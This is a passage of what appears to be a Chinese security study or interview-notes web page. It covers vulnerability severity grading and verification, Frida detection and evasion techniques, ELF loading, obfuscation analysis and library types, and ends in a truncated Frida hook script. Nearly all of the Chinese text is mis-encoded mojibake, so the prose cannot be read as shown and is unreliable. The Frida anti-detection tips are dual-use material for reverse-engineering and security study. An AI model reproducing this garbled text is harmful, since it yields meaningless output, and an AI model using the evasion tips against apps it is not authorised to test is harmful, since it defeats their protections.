¸å¿ƒä¸šåŠ¡çš„CSRFç­‰ï¼‰ã€‚</li><li>å¹³è¡Œè¶Šæƒæ“ä½œï¼ˆå¦‚ç»•è¿‡é™åˆ¶ä¿®æ”¹ç”¨æˆ·èµ„æ–™ã€æ‰§è¡Œç”¨æˆ·æ“ä½œç­‰ï¼‰ã€‚</li><li>ç”±éªŒè¯ç é€»è¾‘å¯¼è‡´ä»»æ„è´¦æˆ·ç™»å½•ã€ä»»æ„å¯†ç æ‰¾å›ç­‰ç³»ç»Ÿæ•æ„Ÿæ“ä½œå¯è¢«çˆ†ç ´æˆåŠŸé€ æˆçš„æ¼æ´ã€‚</li><li>æœ¬åœ°ä¿å­˜çš„æ•æ„Ÿè®¤è¯å¯†é’¥ä¿¡æ¯æ³„éœ²ï¼Œéœ€èƒ½åšå‡ºæœ‰æ•ˆåˆ©ç”¨ã€‚</li><li>å››ä½éªŒè¯ç çˆ†ç ´é‡ç½®å¯†ç æˆ–è€…ç™»å½•è´¦å·ã€‚</li><li>å¿ƒè„æ»´è¡€æ¼æ´ã€‚</li><li>XMLæ³¨å…¥ã€‚</li><li>æ™®é€šçš„åå°æˆ–è€…è¾¹ç¼˜ç³»ç»Ÿçš„åå°ã€‚</li><li>ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆå¦‚ä¸Šä¼ htmlå¯¼è‡´å­˜å‚¨XSSï¼Œå…¶ä»–æƒ…å†µé™¤å¤–ï¼‰ã€‚</li></ul></li><li><p><strong>ä½å±æ¼æ´</strong>ï¼š</p><ul><li>å¯¹ç³»ç»Ÿçš„åŠŸèƒ½æˆ–æ€§èƒ½å½±å“è¾ƒå°ã€‚</li><li>æ”»å‡»è€…åªèƒ½è·å¾—éæ•æ„Ÿä¿¡æ¯æˆ–æ‰§è¡Œæœ‰é™çš„æ“ä½œã€‚</li><li>å­˜åœ¨å·²çŸ¥çš„è§£å†³æ–¹æ¡ˆæˆ–ä¸´æ—¶ä¿®å¤æªæ–½ã€‚</li></ul></li></ol><h3 id="æ¼æ´éªŒè¯çš„é€»è¾‘å’Œæµç¨‹"><a href="#æ¼æ´éªŒè¯çš„é€»è¾‘å’Œæµç¨‹" class="headerlink" title="æ¼æ´éªŒè¯çš„é€»è¾‘å’Œæµç¨‹"></a>æ¼æ´éªŒè¯çš„é€»è¾‘å’Œæµç¨‹</h3><ol><li><p><strong>ç¯å¢ƒå‡†å¤‡</strong>ï¼š</p><ul><li>ç¡®ä¿æµ‹è¯•ç¯å¢ƒä¸ç”Ÿäº§ç¯å¢ƒä¸€è‡´ï¼Œé¿å…å› ç¯å¢ƒå·®å¼‚å¯¼è‡´çš„è¯¯åˆ¤ã€‚</li><li>å‡†å¤‡å¿…è¦çš„æµ‹è¯•å·¥å…·å’Œæ•°æ®ã€‚</li></ul></li><li><p><strong>æ¼æ´å¤ç°</strong>ï¼š</p><ul><li>æ ¹æ®æäº¤çš„æ¼æ´æŠ¥å‘Šï¼Œå°è¯•å¤ç°æ¼æ´ã€‚</li><li>è®°å½•å¤ç°æ­¥éª¤å’Œç»“æœï¼Œç¡®ä¿æ¼æ´çš„çœŸå®æ€§å’Œå¯é‡å¤æ€§ã€‚</li></ul></li><li><p><strong>å½±å“è¯„ä¼°</strong>ï¼š</p><ul><li>è¯„ä¼°æ¼æ´å¯¹ç³»ç»ŸåŠŸèƒ½ã€æ€§èƒ½ã€å®‰å…¨æ€§çš„æ½œåœ¨å½±å“ã€‚</li><li>ç¡®å®šæ¼æ´å¯èƒ½å½±å“çš„ç”¨æˆ·èŒƒå›´å’Œä¸šåŠ¡èŒƒå›´ã€‚</li></ul></li><li><p><strong>åˆ©ç”¨éš¾åº¦è¯„ä¼°</strong>ï¼š</p><ul><li>è¯„ä¼°æ¼æ´çš„åˆ©ç”¨éš¾åº¦ï¼ŒåŒ…æ‹¬æ˜¯å¦éœ€è¦ç‰¹å®šæ¡ä»¶ã€æ˜¯å¦éœ€è¦é«˜çº§æŠ€èƒ½ç­‰ã€‚</li></ul></li><li><p><strong>å¯å‘ç°æ€§è¯„ä¼°</strong>ï¼š</p><ul><li>è¯„ä¼°æ¼æ´çš„å¯å‘ç°æ€§ï¼Œå³æ”»å‡»è€…å‘ç°è¯¥æ¼æ´çš„éš¾æ˜“ç¨‹åº¦ã€‚</li></ul></li><li><p><strong>ç»¼åˆè¯„åˆ†</strong>ï¼š</p><ul><li>ç»“åˆä¸Šè¿°è¯„ä¼°ç»“æœï¼Œæ ¹æ®360SRCçš„è¯„åˆ†æ ‡å‡†ï¼Œå¯¹æ¼æ´è¿›è¡Œç»¼åˆè¯„åˆ†ï¼Œç¡®å®šæ¼æ´ç­‰çº§ã€‚</li></ul></li><li><p><strong>æŠ¥å‘Šç”Ÿæˆ</strong>ï¼š</p><ul><li>ç”Ÿæˆè¯¦ç»†çš„æ¼æ´æŠ¥å‘Šï¼ŒåŒ…æ‹¬æ¼æ´æè¿°ã€å¤ç°æ­¥éª¤ã€å½±å“è¯„ä¼°ã€åˆ©ç”¨éš¾åº¦ã€å¯å‘ç°æ€§ç­‰ä¿¡æ¯ã€‚</li><li>æäº¤æŠ¥å‘Šç»™ç›¸å…³å›¢é˜Ÿè¿›è¡Œä¿®å¤å’Œå¤„ç†ã€‚</li></ul></li></ol><h2 id="ç§»åŠ¨å®‰å…¨"><a href="#ç§»åŠ¨å®‰å…¨" class="headerlink" title="ç§»åŠ¨å®‰å…¨"></a>ç§»åŠ¨å®‰å…¨</h2><h3 id="Fridaæ£€æµ‹å’Œåæ£€æµ‹çš„ç›¸å…³æŠ€æœ¯æˆ–ç‰¹å¾"><a href="#Fridaæ£€æµ‹å’Œåæ£€æµ‹çš„ç›¸å…³æŠ€æœ¯æˆ–ç‰¹å¾" class="headerlink" title="Fridaæ£€æµ‹å’Œåæ£€æµ‹çš„ç›¸å…³æŠ€æœ¯æˆ–ç‰¹å¾"></a>Fridaæ£€æµ‹å’Œåæ£€æµ‹çš„ç›¸å…³æŠ€æœ¯æˆ–ç‰¹å¾</h3><ul><li><strong>æ£€æµ‹æŠ€æœ¯</strong><ul><li><strong>è¿›ç¨‹åæ£€æµ‹</strong>ï¼šéå†è¿è¡Œçš„è¿›ç¨‹ï¼Œå¯¹æ¯”è¿›ç¨‹åæ˜¯å¦ä¸ºfridaserverã€‚</li><li><strong>ç«¯å£æ£€æµ‹</strong>ï¼šé€šè¿‡éå†ç«¯å£æ¥æ£€æŸ¥ frida serverï¼Œé€šå¸¸æ˜¯27042ç«¯å£ã€‚</li><li><strong>mapsæ–‡ä»¶æ£€æµ‹</strong>ï¼šåœ¨&#x2F;proc&#x2F;self&#x2F;maps ä¸­ä¼šå‡ºç°libgadget.so ,æˆ–frida-agent-32.so,frida-agent.soç­‰æ¨¡å—ã€‚</li><li><strong>fdæ£€æµ‹</strong>ï¼šæ£€æŸ¥&#x2F;proc&#x2F;self&#x2F;fd&#x2F;ä¸‹çš„æ–‡ä»¶æè¿°ç¬¦ï¼ŒæŸ¥æ‰¾ä¸fridaç›¸å…³çš„é“¾æ¥ã€‚</li><li><strong>çº¿ç¨‹åæ£€æµ‹</strong>ï¼šè¯»å–&#x2F;proc&#x2F;self&#x2F;task&#x2F;tid&#x2F;statusæ–‡ä»¶ï¼Œæ£€æŸ¥çº¿ç¨‹åæ˜¯å¦åŒ…å«gmainã€gum-js-loopç­‰ã€‚</li><li><strong>inlinehookæ£€æµ‹</strong>ï¼šæ£€æµ‹æ˜¯å¦å¯¹å…³é”®å‡½æ•°è¿›è¡Œäº†inlinehookã€‚</li></ul></li><li><strong>åæ£€æµ‹æŠ€æœ¯</strong><ul><li><strong>ä¿®æ”¹Frida serveræ–‡ä»¶å</strong>ï¼šæ›´æ”¹fridaserverçš„æ–‡ä»¶åï¼Œç»•è¿‡åŸºäºæ–‡ä»¶åçš„æ£€æµ‹ã€‚</li><li><strong>ä¿®æ”¹Frida serverç«¯å£</strong>ï¼šé€šè¿‡å‘½ä»¤è¡ŒæŒ‡å®šå‚æ•°æ”¹å˜fridaserverçš„ç›‘å¬ç«¯å£ã€‚</li><li><strong>ä»¥spawnæ¨¡å¼å¯åŠ¨åº”ç”¨</strong>ï¼šä¸»è¦æ˜¯ä¸ºäº†è¿‡æ‰åŒè¿›ç¨‹ä¿æŠ¤ã€‚</li><li><strong>hookç³»ç»Ÿåº“å‡½æ•°</strong>ï¼šå¦‚hook strstrã€strcmpç­‰å‡½æ•°ï¼Œç»•è¿‡å¯¹mapsæ–‡ä»¶ã€çº¿ç¨‹åç­‰çš„æ£€æµ‹ã€‚</li><li><strong>æ›´æ”¹Frida serverçš„ç‰¹å¾</strong>ï¼šæ‰‹åŠ¨ç¼–è¯‘Hluda Frida Serverç­‰ï¼Œæ›´æ”¹fridaserverçš„è¯¸å¤šç‰¹å¾ï¼Œä»è€Œè¾¾åˆ°éšè—çš„æ•ˆæœã€‚</li></ul></li></ul><h3 id="ELFæ–‡ä»¶çš„åŠ è½½æ–¹å¼å’Œè¿‡ç¨‹"><a href="#ELFæ–‡ä»¶çš„åŠ è½½æ–¹å¼å’Œè¿‡ç¨‹" class="headerlink" title="ELFæ–‡ä»¶çš„åŠ è½½æ–¹å¼å’Œè¿‡ç¨‹"></a>ELFæ–‡ä»¶çš„åŠ è½½æ–¹å¼å’Œè¿‡ç¨‹</h3><ol><li><strong>è¯»å–æ–‡ä»¶å¤´éƒ¨</strong>ï¼šå†…æ ¸é¦–å…ˆè¯»å–ELFæ–‡ä»¶å¤´éƒ¨ï¼Œè·å–å„ç§æ•°æ®ç»“æ„çš„ä¿¡æ¯ï¼Œå¦‚ç¨‹åºå¤´è¡¨ã€æ®µè¡¨ç­‰ã€‚</li><li><strong>åŠ è½½å¯åŠ è½½æ®µ</strong>ï¼šæ ¹æ®æ®µè¡¨ä¸­çš„ä¿¡æ¯ï¼Œè°ƒç”¨mmap()æŠŠæ‰¾åˆ°çš„å¯åŠ è½½æ®µï¼ˆå¦‚æ–‡æœ¬æ®µã€æ•°æ®æ®µï¼‰çš„å†…å®¹åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶è®¾ç½®ç›¸åº”çš„æƒé™ã€‚</li><li><strong>åŠ è½½åŠ¨æ€é“¾æ¥å™¨</strong>ï¼šä»PT_INTERPçš„æ®µä¸­æ‰¾åˆ°æ‰€å¯¹åº”çš„åŠ¨æ€é“¾æ¥å™¨åç§°ï¼Œå¹¶åŠ è½½åŠ¨æ€é“¾æ¥å™¨ã€‚</li><li><strong>è®¾ç½®è¿›ç¨‹å †æ ˆ</strong>ï¼šå†…æ ¸æŠŠæ–°è¿›ç¨‹çš„å †æ ˆä¸­è®¾ç½®ä¸€äº›æ ‡è®°å¯¹ï¼Œä»¥æŒ‡ç¤ºåŠ¨æ€é“¾æ¥å™¨çš„ç›¸å…³æ“ä½œã€‚</li><li><strong>ä¼ é€’æ§åˆ¶æƒç»™åŠ¨æ€é“¾æ¥å™¨</strong>ï¼šå†…æ ¸æŠŠæ§åˆ¶æƒä¼ é€’ç»™åŠ¨æ€é“¾æ¥å™¨ã€‚</li><li><strong>åŠ¨æ€é“¾æ¥å™¨å¤„ç†å…±äº«åº“</strong>ï¼šåŠ¨æ€é“¾æ¥å™¨æ£€æŸ¥ç¨‹åºå¯¹å…±äº«åº“çš„ä¾èµ–æ€§ï¼Œå¹¶åœ¨éœ€è¦æ—¶å¯¹å…¶è¿›è¡ŒåŠ è½½ã€‚</li><li><strong>é‡å®šä½</strong>ï¼šåŠ¨æ€é“¾æ¥å™¨å¯¹ç¨‹åºçš„å¤–éƒ¨å¼•ç”¨è¿›è¡Œé‡å®šä½ï¼Œç¡®å®šå¼•ç”¨çš„å¤–éƒ¨å˜é‡&#x2F;å‡½æ•°çš„åœ°å€ã€‚</li><li><strong>æ‰§è¡Œåˆå§‹åŒ–ä»£ç </strong>ï¼šåŠ¨æ€é“¾æ¥å™¨æ‰§è¡Œåœ¨ELFæ–‡ä»¶ä¸­æ ‡è®°ä¸º.initçš„èŠ‚çš„ä»£ç ï¼Œè¿›è¡Œç¨‹åºè¿è¡Œçš„åˆå§‹åŒ–ã€‚</li><li><strong>å¼€å§‹æ‰§è¡Œç¨‹åº</strong>ï¼šåŠ¨æ€é“¾æ¥å™¨æŠŠæ§åˆ¶ä¼ é€’ç»™ç¨‹åºï¼Œä»ELFæ–‡ä»¶å¤´éƒ¨ä¸­å®šä¹‰çš„ç¨‹åºè¿›å…¥ç‚¹å¼€å§‹æ‰§è¡Œã€‚<br>ELFï¼ˆExecutable and Linkable Formatï¼‰æ–‡ä»¶å¤´åŒ…å«äº†æè¿°ELFæ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯å’Œç»“æ„çš„å­—æ®µï¼Œä»¥ä¸‹æ˜¯ELFæ–‡ä»¶å¤´çš„ä¸»è¦å­—æ®µï¼š</li></ol><ul><li><code>e_ident</code>ï¼šæ ‡è¯†å­—æ®µï¼ŒåŒ…å«ELFæ–‡ä»¶çš„é­”æ•°ï¼ˆå¦‚<code>\x7F``E``L``F</code>ï¼‰å’Œæ–‡ä»¶ç±»åˆ«çš„ä¿¡æ¯ï¼ˆå¦‚32ä½æˆ–64ä½ï¼‰ã€‚</li><li><code>e_type</code>ï¼šæ–‡ä»¶ç±»å‹ï¼Œå¦‚å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ<code>ET_EXEC</code>ï¼‰ã€å¯é‡å®šä½æ–‡ä»¶ï¼ˆ<code>ET_REL</code>ï¼‰ã€å…±äº«ç›®æ ‡æ–‡ä»¶ï¼ˆ<code>ET_DYN</code>ï¼‰ç­‰ã€‚</li><li><code>e_machine</code>ï¼šç›®æ ‡æœºå™¨æ¶æ„ï¼Œå¦‚x86ï¼ˆ<code>EM_386</code>ï¼‰ã€ARMï¼ˆ<code>EM_ARM</code>ï¼‰ç­‰ã€‚</li><li><code>e_version</code>ï¼šæ–‡ä»¶ç‰ˆæœ¬å·ã€‚</li><li><code>e_entry</code>ï¼šç¨‹åºå…¥å£çš„è™šæ‹Ÿåœ°å€ï¼Œå½“ç¨‹åºè¢«åŠ è½½æ‰§è¡Œæ—¶ï¼Œä»è¿™ä¸ªåœ°å€å¼€å§‹è¿è¡Œã€‚</li><li><code>e_phoff</code>ï¼šç¨‹åºå¤´è¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»ä½ç½®ã€‚</li><li><code>e_shoff</code>ï¼šèŠ‚å¤´è¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»ä½ç½®ã€‚</li><li><code>e_flags</code>ï¼šä¸ç›®æ ‡æœºå™¨ç›¸å…³çš„æ ‡å¿—ã€‚</li><li><code>e_ehsize</code>ï¼šELFå¤´æœ¬èº«çš„å¤§å°ã€‚</li><li><code>e_phentsize</code>ï¼šç¨‹åºå¤´è¡¨ä¸­æ¯ä¸ªæ¡ç›®çš„å¤§å°ã€‚</li><li><code>e_phnum</code>ï¼šç¨‹åºå¤´è¡¨ä¸­çš„æ¡ç›®æ•°ç›®ã€‚</li><li><code>e_shentsize</code>ï¼šèŠ‚å¤´è¡¨ä¸­æ¯ä¸ªæ¡ç›®çš„å¤§å°ã€‚</li><li><code>e_shnum</code>ï¼šèŠ‚å¤´è¡¨ä¸­çš„æ¡ç›®æ•°ç›®ã€‚</li><li><code>e_shstrndx</code>ï¼šèŠ‚å¤´è¡¨ä¸­å­—ç¬¦ä¸²è¡¨èŠ‚çš„ç´¢å¼•ã€‚</li></ul><h3 id="å¸¸è§çš„æ··æ·†æŠ€æœ¯ä»¥åŠé’ˆå¯¹æ¯ç§æŠ€æœ¯å¦‚ä½•åˆ†æ"><a href="#å¸¸è§çš„æ··æ·†æŠ€æœ¯ä»¥åŠé’ˆå¯¹æ¯ç§æŠ€æœ¯å¦‚ä½•åˆ†æ" class="headerlink" title="å¸¸è§çš„æ··æ·†æŠ€æœ¯ä»¥åŠé’ˆå¯¹æ¯ç§æŠ€æœ¯å¦‚ä½•åˆ†æ"></a>å¸¸è§çš„æ··æ·†æŠ€æœ¯ä»¥åŠé’ˆå¯¹æ¯ç§æŠ€æœ¯å¦‚ä½•åˆ†æ</h3><ul><li><strong>ä»£ç æ··æ·†</strong><ul><li><strong>æŠ€æœ¯æè¿°</strong>ï¼šé€šè¿‡æ”¹å˜ä»£ç çš„ç»“æ„å’Œé€»è¾‘ï¼Œä½¿ä»£ç éš¾ä»¥é˜…è¯»å’Œç†è§£ï¼Œå¦‚å˜é‡åæ›¿æ¢ã€ä»£ç å—æ‰“ä¹±ç­‰ã€‚</li><li><strong>åˆ†ææ–¹æ³•</strong>ï¼šä½¿ç”¨åç¼–è¯‘å·¥å…·ï¼ˆå¦‚IDAã€JEBç­‰ï¼‰å¯¹æ··æ·†åçš„ä»£ç è¿›è¡Œåç¼–è¯‘ï¼Œç»“åˆé™æ€åˆ†æå’ŒåŠ¨æ€è°ƒè¯•ï¼Œé€æ­¥è¿˜åŸä»£ç çš„åŸå§‹é€»è¾‘ã€‚</li></ul></li><li><strong>å­—ç¬¦ä¸²åŠ å¯†</strong><ul><li><strong>æŠ€æœ¯æè¿°</strong>ï¼šå¯¹å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œé˜²æ­¢ç›´æ¥ä»ä»£ç ä¸­è·å–æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·åã€å¯†ç ç­‰ã€‚</li><li><strong>åˆ†ææ–¹æ³•</strong>ï¼šé€šè¿‡åŠ¨æ€è°ƒè¯•ï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶æ•è·åŠ å¯†å­—ç¬¦ä¸²çš„è§£å¯†è¿‡ç¨‹ï¼Œæˆ–è€…åˆ†æåŠ å¯†ç®—æ³•ï¼Œå°è¯•é€†å‘è§£å¯†ã€‚</li></ul></li><li><strong>æ§åˆ¶æµå¹³å¦åŒ–</strong><ul><li><strong>æŠ€æœ¯æè¿°</strong>ï¼šå°†ç¨‹åºçš„æ§åˆ¶æµç»“æ„è¿›è¡Œå¹³å¦åŒ–å¤„ç†ï¼Œå¢åŠ æ§åˆ¶æµçš„å¤æ‚åº¦ï¼Œä½¿åˆ†æäººå‘˜éš¾ä»¥ç†è§£ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</li><li><strong>åˆ†ææ–¹æ³•</strong>ï¼šé€šè¿‡åˆ†ææ§åˆ¶æµå›¾ï¼Œè¯†åˆ«å¹³å¦åŒ–åçš„ç»“æ„ï¼Œç»“åˆå¯¹å…³é”®å‡½æ•°çš„åˆ†æï¼Œè¿˜åŸåŸå§‹çš„æ§åˆ¶æµã€‚</li></ul></li><li><strong>èµ„æºæ–‡ä»¶åŠ å¯†</strong><ul><li><strong>æŠ€æœ¯æè¿°</strong>ï¼šå¯¹åº”ç”¨çš„èµ„æºæ–‡ä»¶ï¼ˆå¦‚å›¾ç‰‡ã€éŸ³é¢‘ç­‰ï¼‰è¿›è¡ŒåŠ å¯†ï¼Œé˜²æ­¢ç›´æ¥æå–å’Œä½¿ç”¨ã€‚</li><li><strong>åˆ†ææ–¹æ³•</strong>ï¼šé€šè¿‡åŠ¨æ€è°ƒè¯•ï¼Œæˆªè·èµ„æºæ–‡ä»¶çš„è§£å¯†è¿‡ç¨‹ï¼Œæˆ–è€…åˆ†æåŠ å¯†ç®—æ³•ï¼Œå°è¯•è§£å¯†èµ„æºæ–‡ä»¶ã€‚</li></ul></li><li><strong>åå°„è°ƒç”¨</strong><ul><li><strong>æŠ€æœ¯æè¿°</strong>ï¼šé€šè¿‡åå°„æœºåˆ¶åŠ¨æ€åŠ è½½ç±»å’Œè°ƒç”¨æ–¹æ³•ï¼Œéšè—ä»£ç çš„è°ƒç”¨å…³ç³»ï¼Œå¢åŠ åˆ†æéš¾åº¦ã€‚</li><li><strong>åˆ†ææ–¹æ³•</strong>ï¼šåˆ†æåå°„è°ƒç”¨çš„ç›¸å…³ä»£ç ï¼Œç¡®å®šè¢«è°ƒç”¨çš„ç±»å’Œæ–¹æ³•ï¼Œç»“åˆå¯¹ç›¸å…³ç±»çš„åˆ†æï¼Œç†è§£ç¨‹åºçš„åŠŸèƒ½ã€‚</li></ul></li></ul><h3 id="åŠ¨æ€åº“å’Œé™æ€åº“æœ‰ä»€ä¹ˆåŒºåˆ«"><a href="#åŠ¨æ€åº“å’Œé™æ€åº“æœ‰ä»€ä¹ˆåŒºåˆ«" class="headerlink" title="åŠ¨æ€åº“å’Œé™æ€åº“æœ‰ä»€ä¹ˆåŒºåˆ«"></a>åŠ¨æ€åº“å’Œé™æ€åº“æœ‰ä»€ä¹ˆåŒºåˆ«</h3><ul><li><p><strong>å®šä¹‰</strong></p><ul><li><strong>åŠ¨æ€åº“</strong>ï¼šåœ¨ç¨‹åºè¿è¡Œæ—¶æ‰è¢«åŠ è½½åˆ°å†…å­˜ä¸­çš„åº“æ–‡ä»¶ï¼Œå¤šä¸ªç¨‹åºå¯ä»¥å…±äº«åŒä¸€ä»½åŠ¨æ€åº“çš„å†…å­˜å‰¯æœ¬ã€‚</li><li><strong>é™æ€åº“</strong>ï¼šåœ¨ç¨‹åºç¼–è¯‘é“¾æ¥æ—¶å°±è¢«é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶åŒ…å«é™æ€åº“çš„ä»£ç å‰¯æœ¬ã€‚</li></ul></li><li><p><strong>é“¾æ¥æ–¹å¼</strong></p><ul><li><strong>åŠ¨æ€åº“</strong>ï¼šåœ¨ç¨‹åºè¿è¡Œæ—¶ç”±æ“ä½œç³»ç»ŸåŠ¨æ€é“¾æ¥å™¨åŠ è½½ã€‚</li><li><strong>é™æ€åº“</strong>ï¼šåœ¨ç¼–è¯‘é˜¶æ®µå°±ä¸ç¨‹åºä»£ç é“¾æ¥åœ¨ä¸€èµ·ã€‚</li></ul></li><li><p><strong>å†…å­˜å ç”¨</strong></p><ul><li><strong>åŠ¨æ€åº“</strong>ï¼šå¤šä¸ªç¨‹åºåŒæ—¶ä½¿ç”¨æ—¶ï¼Œåªå ç”¨ä¸€ä»½å†…å­˜ã€‚</li><li><strong>é™æ€åº“</strong>ï¼šæ¯ä¸ªä½¿ç”¨è¯¥åº“çš„ç¨‹åºéƒ½åŒ…å«ä¸€ä»½å®Œæ•´çš„åº“ä»£ç å‰¯æœ¬ï¼Œå†…å­˜å ç”¨è¾ƒå¤§ã€‚</li></ul></li><li><p><strong>æ›´æ–°ç»´æŠ¤</strong></p><ul><li><strong>åŠ¨æ€åº“</strong>ï¼šæ›´æ–°åº“æ–‡ä»¶åï¼Œæ‰€æœ‰ä¾èµ–è¯¥åº“çš„ç¨‹åºéƒ½ä¼šè‡ªåŠ¨ä½¿ç”¨æ–°çš„ç‰ˆæœ¬ã€‚</li><li><strong>é™æ€åº“</strong>ï¼šå¦‚æœéœ€è¦æ›´æ–°ï¼Œéœ€è¦é‡æ–°ç¼–è¯‘é“¾æ¥ç¨‹åºã€‚</li></ul></li><li><p><strong>å¸¸è§æ–‡ä»¶åç¼€</strong></p><ul><li><strong>åŠ¨æ€åº“</strong>ï¼šåœ¨Linuxç³»ç»Ÿï¼ˆåŒ…æ‹¬Androidï¼‰ä¸­ï¼ŒåŠ¨æ€åº“çš„å¸¸è§æ–‡ä»¶åç¼€æ˜¯<code>.so</code>ï¼ˆShared Objectçš„ç¼©å†™ï¼‰ã€‚</li><li><strong>é™æ€åº“</strong>ï¼šåœ¨Linuxç³»ç»Ÿä¸­ï¼Œé™æ€åº“çš„å¸¸è§æ–‡ä»¶åç¼€æ˜¯<code>.a</code>ã€‚</li></ul></li><li><p><strong>åŠ è½½æ–¹å¼</strong></p><ul><li><strong>åŠ¨æ€åº“</strong>ï¼šåœ¨Androidä¸­ï¼ŒåŠ¨æ€åº“é€šå¸¸åœ¨ç¨‹åºè¿è¡Œæ—¶ç”±ç³»ç»ŸåŠ¨æ€åŠ è½½å™¨åŠ è½½ã€‚åŠ è½½æ–¹å¼ä¸»è¦æœ‰ä¸¤ç§ï¼š<ul><li><strong>é€šè¿‡<code>dlopen</code>å‡½æ•°åŠ è½½</strong>ï¼šç¨‹åºåœ¨è¿è¡Œæ—¶è°ƒç”¨<code>dlopen</code>å‡½æ•°æ¥æ˜¾å¼åŠ è½½åŠ¨æ€åº“ï¼Œå¹¶å¯ä»¥é€šè¿‡<code>dlsym</code>å‡½æ•°è·å–åº“ä¸­å‡½æ•°çš„åœ°å€è¿›è¡Œè°ƒç”¨ã€‚</li><li><strong>åœ¨ç¨‹åºå¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½</strong>ï¼šå¦‚æœåŠ¨æ€åº“åœ¨ç¨‹åºçš„é“¾æ¥é˜¶æ®µè¢«æŒ‡å®šï¼Œç³»ç»Ÿä¼šåœ¨ç¨‹åºå¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½æ‰€éœ€çš„åŠ¨æ€åº“ã€‚</li></ul></li><li><strong>é™æ€åº“</strong>ï¼šåœ¨Androidä¸­ï¼Œé™æ€åº“åœ¨ç¨‹åºç¼–è¯‘é“¾æ¥é˜¶æ®µå°±è¢«é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚åŠ è½½æ–¹å¼æ˜¯åœ¨ç¼–è¯‘æ—¶ä½¿ç”¨<code>-l</code>é€‰é¡¹æŒ‡å®šé™æ€åº“æ–‡ä»¶ï¼Œé“¾æ¥å™¨ä¼šå°†é™æ€åº“ä¸­çš„ä»£ç å’Œæ•°æ®é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶åŒ…å«é™æ€åº“çš„å®Œæ•´å‰¯æœ¬ã€‚</li></ul></li><li><p><strong>åœ¨Androidå½“ä¸­çš„æƒ…å†µ</strong></p><ul><li><strong>åŠ¨æ€åº“</strong>ï¼šAndroidä¸­çš„åŠ¨æ€åº“é€šå¸¸å­˜æ”¾åœ¨<code>/system/lib/</code>æˆ–<code>/vendor/lib/</code>ç­‰ç›®å½•ä¸‹ï¼Œåº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥å°†ç§æœ‰åŠ¨æ€åº“æ”¾åœ¨è‡ªèº«çš„<code>lib</code>ç›®å½•ä¸‹ã€‚åº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶é€šè¿‡åŠ¨æ€åŠ è½½å™¨åŠ è½½è¿™äº›åŠ¨æ€åº“ã€‚</li><li><strong>é™æ€åº“</strong>ï¼šé™æ€åº“åœ¨Androidä¸­é€šå¸¸ä»¥<code>.a</code>æ–‡ä»¶çš„å½¢å¼å­˜åœ¨ï¼Œå¼€å‘è€…åœ¨ç¼–è¯‘åº”ç”¨ç¨‹åºæ—¶å°†å…¶é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚é™æ€åº“çš„ä½¿ç”¨å¯ä»¥å‡å°‘åº”ç”¨ç¨‹åºå¯¹å¤–éƒ¨åº“æ–‡ä»¶çš„ä¾èµ–ï¼Œä½†ä¼šå¢åŠ å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ã€‚</li></ul></li></ul><h3 id="nativeçš„hookå‡½æ•°hookæŸä¸ªåœ°å€çš„å‡½æ•°å¹¶ä¿®æ”¹å€¼"><a href="#nativeçš„hookå‡½æ•°hookæŸä¸ªåœ°å€çš„å‡½æ•°å¹¶ä¿®æ”¹å€¼" class="headerlink" title="nativeçš„hookå‡½æ•°hookæŸä¸ªåœ°å€çš„å‡½æ•°å¹¶ä¿®æ”¹å€¼"></a>nativeçš„hookå‡½æ•°hookæŸä¸ªåœ°å€çš„å‡½æ•°å¹¶ä¿®æ”¹å€¼</h3><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œä½¿ç”¨Fridaçš„Native APIæ¥hookæŸä¸ªåœ°å€çš„å‡½æ•°å¹¶ä¿®æ”¹å€¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(</span><br><span class="line">    <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//è·å–å½“å‰å®‰å“è®¾å¤‡çš„ç³»ç»Ÿç‰ˆæœ¬</span></span><br><span class="line">        <span class="keyword">var</span> v=<span class="title class_">Java</span>.<span class="property">androidVersion</span>;</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&#x27;Version:&#x27;</span>+v);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°è°ƒç”¨å †æ ˆ</span></span><br><span class="line">        <span class="keyword">function</span> <span 